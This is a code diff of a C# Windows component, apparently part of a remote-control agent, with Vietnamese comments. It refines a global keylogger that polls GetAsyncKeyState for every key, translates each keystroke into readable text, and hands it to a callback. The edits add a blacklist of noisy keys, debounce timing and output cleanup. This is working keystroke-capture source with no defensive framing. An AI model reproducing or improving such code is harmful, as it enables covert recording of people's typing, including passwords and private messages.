@@ -1,6 +1,6 @@
 using System;
+using System.Collections.Generic;
 using System.Runtime.InteropServices;
-using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms; 
@@ -18,17 +18,28 @@ namespace RCS.Agent.Services.Windows
         [DllImport("user32.dll")]
         private static extern short GetKeyState(int nVirtKey);
 
-        // Mảng lưu trạng thái
         private readonly bool[] _prevKeyStates = new bool[256];
         private readonly DateTime[] _lastPressTimes = new DateTime[256];
         private readonly DateTime[] _lastReleaseTimes = new DateTime[256];
         
-        // Cấu hình độ trễ
         private const int REPEAT_DELAY_MS = 600; 
         private const int REPEAT_INTERVAL_MS = 200; 
-        
-        // SỬA: Tăng thời gian chống nảy lên 100ms để tránh bị double khi chạm nhẹ
         private const int DEBOUNCE_TIME_MS = 100; 
+
+        // --- DANH SÁCH ĐEN (BLACKLIST) CÁC PHÍM GÂY NHIỄU ---
+        private readonly HashSet<int> _ignoredKeys = new HashSet<int>
+        {
+            0x01, // VK_LBUTTON (Chuột trái)
+            0x02, // VK_RBUTTON (Chuột phải)
+            0x04, // VK_MBUTTON (Chuột giữa)
+            0x05, // VK_XBUTTON1
+            0x06, // VK_XBUTTON2
+            0xFE, // VK_OEM_CLEAR (OemClear - Thường tự nhảy)
+            0xFF, // Unknown
+            0x10, // VK_SHIFT (Chung chung - Đã xử lý LShift/RShift riêng)
+            0x11, // VK_CONTROL (Chung chung)
+            0x12, // VK_MENU (Alt chung chung)
+        };
 
         public void Start(Action<string> onKeyPressed)
         {
@@ -53,28 +64,29 @@ namespace RCS.Agent.Services.Windows
         {
             while (!token.IsCancellationRequested)
             {
+                // SỬA: Bắt đầu từ 8 (Backspace) thay vì 0 để bỏ qua các mã null/mouse thấp
+                // Nhưng vẫn cần check Blacklist vì chuột nằm rải rác
                 for (int i = 8; i < 256; i++)
                 {
+                    // --- BỘ LỌC NHIỄU (FILTER) ---
+                    if (_ignoredKeys.Contains(i)) continue;
+
                     bool isDown = (GetAsyncKeyState(i) & 0x8000) != 0;
                     bool wasDown = _prevKeyStates[i];
                     var now = DateTime.Now;
 
                     if (isDown)
                     {
-                        if (!wasDown) // TRƯỜNG HỢP 1: Nhấn mới
+                        if (!wasDown) // Nhấn mới
                         {
                             double msSinceRelease = (now - _lastReleaseTimes[i]).TotalMilliseconds;
-                            
-                            // Chỉ xử lý nếu không phải là nảy phím
                             if (msSinceRelease > DEBOUNCE_TIME_MS)
                             {
                                 ProcessKey(i);
                             }
-
-                            // Reset thời gian chờ lặp lại
                             _lastPressTimes[i] = now.AddMilliseconds(REPEAT_DELAY_MS); 
                         }
-                        else if (now > _lastPressTimes[i]) // TRƯỜNG HỢP 2: Giữ phím (Repeat)
+                        else if (now > _lastPressTimes[i]) // Giữ phím
                         {
                             ProcessKey(i);
                             _lastPressTimes[i] = now.AddMilliseconds(REPEAT_INTERVAL_MS); 
@@ -94,25 +106,14 @@ namespace RCS.Agent.Services.Windows
         private void ProcessKey(int vKey)
         {
             Keys key = (Keys)vKey;
-
-            // SỬA: Bỏ qua các mã phím chung (Generic) để tránh trùng lặp với phím trái/phải
-            // 16 = Shift, 17 = Control, 18 = Alt (Menu)
-            if (key == Keys.ShiftKey || key == Keys.ControlKey || key == Keys.Menu) return;
-
             string keyStr = "";
 
-            // Bỏ qua chuột
-            if (key == Keys.LButton || key == Keys.RButton || key == Keys.MButton) return;
-
-            // --- Xử lý hiển thị cho các phím chức năng ---
-            
-            // 1. Modifier Keys (Chỉ bắt các phím Left/Right cụ thể)
+            // Xử lý các phím chức năng cụ thể
             if (key == Keys.LShiftKey || key == Keys.RShiftKey) keyStr = "[SHIFT]";
             else if (key == Keys.LControlKey || key == Keys.RControlKey) keyStr = "[CTRL]";
             else if (key == Keys.LMenu || key == Keys.RMenu) keyStr = "[ALT]";
             else if (key == Keys.LWin || key == Keys.RWin) keyStr = "[WIN]";
-
-            // 2. Special Keys
+            
             else if (key == Keys.Enter) keyStr = "\n[ENTER]\n";
             else if (key == Keys.Space) keyStr = " ";
             else if (key == Keys.Back) keyStr = "[BACK]";
@@ -121,7 +122,7 @@ namespace RCS.Agent.Services.Windows
             else if (key == Keys.Delete) keyStr = "[DEL]";
             else if (key == Keys.CapsLock) keyStr = "[CAPS]";
 
-            // 3. Ký tự chữ và số
+            // Ký tự chữ và số
             else if (key.ToString().Length == 1)
             {
                 bool shift = (GetKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
@@ -134,7 +135,6 @@ namespace RCS.Agent.Services.Windows
                 }
                 else if (key >= Keys.D0 && key <= Keys.D9)
                 {
-                     // Xử lý Shift + Số -> Ký tự đặc biệt
                      if (shift) keyStr = GetShiftNumberChar(key);
                      else keyStr = key.ToString().Replace("D", "");
                 }
@@ -145,8 +145,12 @@ namespace RCS.Agent.Services.Windows
             }
             else
             {
-                // Các phím còn lại (F1-F12...)
-                keyStr = $"[{key}]";
+                // Các phím còn lại (F1-F12...) -> Đặt trong ngoặc
+                // Kiểm tra lại lần nữa để chắc chắn không in ra OemClear
+                if (key != Keys.OemClear) 
+                {
+                    keyStr = $"[{key}]";
+                }
             }
 
             if (!string.IsNullOrEmpty(keyStr))
@@ -155,7 +159,6 @@ namespace RCS.Agent.Services.Windows
             }
         }
 
-        // Helper: Map phím số sang ký tự đặc biệt khi giữ Shift
         private string GetShiftNumberChar(Keys key)
         {
             switch (key)
